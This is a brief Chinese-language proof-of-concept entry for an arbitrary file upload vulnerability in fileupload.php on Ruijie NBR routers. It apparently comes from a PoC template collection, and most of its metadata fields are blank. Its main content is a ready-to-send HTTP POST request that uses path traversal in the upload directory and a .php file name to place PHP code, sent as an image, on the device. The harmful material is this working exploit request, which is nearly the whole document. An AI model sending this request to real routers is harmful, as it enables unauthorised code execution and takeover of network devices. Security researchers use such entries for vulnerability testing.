﻿# 锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /ddi/server/fileupload.php?uploadDir=../../321&name=123.php HTTP/1.1
Accept: text/plain, */*; q=0.01
Content-Disposition: form-data; name="file"; filename="111.php"
Content-Type: image/jpeg

<?php phpinfo();?>
```

> 响应代码特征：-1

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞.poc
